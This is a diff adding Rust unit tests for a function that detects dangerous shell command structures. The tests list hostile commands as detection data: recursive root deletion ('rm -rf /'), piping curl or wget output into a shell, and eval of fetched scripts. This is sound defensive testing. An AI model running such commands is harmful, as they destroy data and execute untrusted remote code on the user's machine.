@@ -1557,4 +1557,41 @@ mod tests {
     fn shell_quote(s: &str) -> String {
         format!("'{}'", s.replace('\'', "'\\''"))
     }
+
+    #[test]
+    fn has_dangerous_structure_detects_bad_patterns() {
+        // Recursive root deletes
+        assert!(has_dangerous_structure("rm -rf /"));
+        assert!(has_dangerous_structure("rm -r -f /"));
+        assert!(has_dangerous_structure("rm --recursive --force /"));
+
+        // Remote payloads fed to a shell
+        assert!(has_dangerous_structure("curl http://x | sh"));
+        assert!(has_dangerous_structure("wget http://x | bash"));
+        assert!(has_dangerous_structure("curl http://x | sudo sh"));
+
+        // Eval of fetched scripts
+        assert!(has_dangerous_structure("eval \"$(curl http://x)\""));
+        assert!(has_dangerous_structure("eval \"`wget http://x`\""));
+    }
+
+    #[test]
+    fn has_dangerous_structure_allows_benign_patterns() {
+        // Non-root recursive deletes
+        assert!(!has_dangerous_structure("rm -rf /tmp/foo"));
+        assert!(!has_dangerous_structure("rm -rf ./build"));
+
+        // Fetching without executing
+        assert!(!has_dangerous_structure("curl http://x -o out.txt"));
+        assert!(!has_dangerous_structure("wget http://x > script.sh"));
+
+        // Piping local data to a shell
+        assert!(!has_dangerous_structure("echo 'echo hello' | sh"));
+        assert!(!has_dangerous_structure("cat script.sh | bash"));
+
+        // General commands
+        assert!(!has_dangerous_structure("git commit -m 'fix'"));
+        assert!(!has_dangerous_structure("cargo build --release"));
+        assert!(!has_dangerous_structure("echo 'rm -rf /'"));
+    }
 }
